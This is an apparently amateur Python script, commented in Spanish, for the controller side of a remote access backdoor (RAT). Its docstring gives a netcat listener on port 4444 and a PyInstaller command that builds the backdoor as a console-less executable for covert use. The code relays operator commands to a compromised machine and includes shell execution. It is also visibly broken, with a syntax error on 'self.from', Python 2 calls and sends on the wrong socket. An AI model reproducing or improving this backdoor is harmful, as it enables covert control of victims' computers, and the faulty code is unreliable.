#!/usr/bin/env python3

"""
    Crea un apuerta trasera para controlar un equipo remoto RAT
    Este script se tiene que ejecutar en la máquina atacante
    Preparamos un puerto local para recibir peticiones
    $ nc -vv -l -p 4444
    Para crear un script python como exe, es necesario tener instalado
    pyintaller, lanzamos:
    # pyinstaller script --onefile --noconsole
    $ ~/pyinstaller.XX back_door.py --onefile --noconsole
"""


import socket
import subprocess
import json


class BD_Server:

    def __init__(self):
        self.con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.con.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        port = 4444
        self.con.bind(("my_ip", port))
        self.con.listen(0)
        self.ctn, self.from = self.con.accept()

    def start(self):
        while True:
            # Recibir un paquete (de tamaño máximo 1024)
            recieved_data = raw_input(">> ")
            recieved_data = recieved_data.split(" ")
            self.pipe(recieved_data)

    def __reduce__(self):
        self.con.close()

    def do(self, command):
        return subprocess.check_output(command, shell=True)

    def pipe(self, data):
        # self.ctn.send(recieved_data)
        # result = self.ctn.recv(1024)
        if data[0] == "exit":
            self.con.close()
            exit()
        self.reliable_send(data)
        return self.reliable_receive()

    def reliable_send(self, data):
        json_d = json.dumps(data)
        self.con.send(json_d)

    def reliable_receive(self):
        json_d = ""
        while True:
            try:
                json_d = self.con.recv(1024)
                return json.loads(json_d)
            except ValueError:
                continue
